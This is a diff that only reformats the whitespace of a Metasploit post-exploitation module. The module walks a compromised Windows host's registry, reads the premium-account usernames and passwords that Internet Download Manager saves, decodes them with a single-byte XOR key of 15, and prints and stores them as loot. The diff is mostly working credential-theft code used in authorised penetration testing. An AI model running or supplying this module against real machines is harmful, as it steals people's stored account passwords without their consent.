@@ -3,43 +3,44 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Windows Gather Internet Download Manager (IDM) Password Extractor',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Windows Gather Internet Download Manager (IDM) Password Extractor',
+        'Description' => %q{
           This module recovers the saved premium download account passwords from
-        Internet Download Manager (IDM). These passwords are stored in an encoded
-        format in the registry. This module traverses through these registry entries
-        and decodes them. Thanks to the template code of theLightCosine's CoreFTP
-        password module.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        =>
-        [
+          Internet Download Manager (IDM). These passwords are stored in an encoded
+          format in the registry. This module traverses through these registry entries
+          and decodes them. Thanks to the template code of theLightCosine's CoreFTP
+          password module.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
           'sil3ntdre4m <sil3ntdre4m[at]gmail.com>',
           'Unknown', # SecurityXploded Team, www.SecurityXploded.com
         ],
-      'Platform'      => [ 'win' ],
-      'SessionTypes'  => [ 'meterpreter' ]
-    ))
+        'Platform' => [ 'win' ],
+        'SessionTypes' => [ 'meterpreter' ]
+      )
+    )
   end
 
   def run
     creds = Rex::Text::Table.new(
-        'Header'  => 'Internet Downloader Manager Credentials',
-        'Indent'   => 1,
-        'Columns' =>
-        [
-          'User',
-          'Password',
-          'Site'
-        ]
-      )
+      'Header' => 'Internet Downloader Manager Credentials',
+      'Indent' => 1,
+      'Columns' =>
+      [
+        'User',
+        'Password',
+        'Site'
+      ]
+    )
 
     registry_enumkeys('HKU').each do |k|
       next unless k.include? "S-1-5-21"
@@ -58,6 +59,7 @@ class MetasploitModule < Msf::Post
           user = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "User")
           epass = registry_getvaldata("HKU\\#{k}\\Software\\DownloadManager\\Passwords\\#{site}", "EncPassword")
           next if epass == nil or epass == ""
+
           pass = xor(epass)
           print_good("Site: #{site} (User=#{user}, Password=#{pass})")
           creds << [user, pass, site]
@@ -73,19 +75,17 @@ class MetasploitModule < Msf::Post
           'Internet Download Manager User Credentials'
         )
         print_good("IDM user credentials saved in: #{path}")
-
       rescue ::Exception => e
         print_error("An error has occurred: #{e.to_s}")
       end
-
     end
   end
 
   def xor(ciphertext)
     pass = ciphertext.unpack("C*")
-    key=15
-    for i in 0 .. pass.length-1 do
-    pass[i] ^= key
+    key = 15
+    for i in 0..pass.length - 1 do
+      pass[i] ^= key
     end
     return pass.pack("C*")
   end
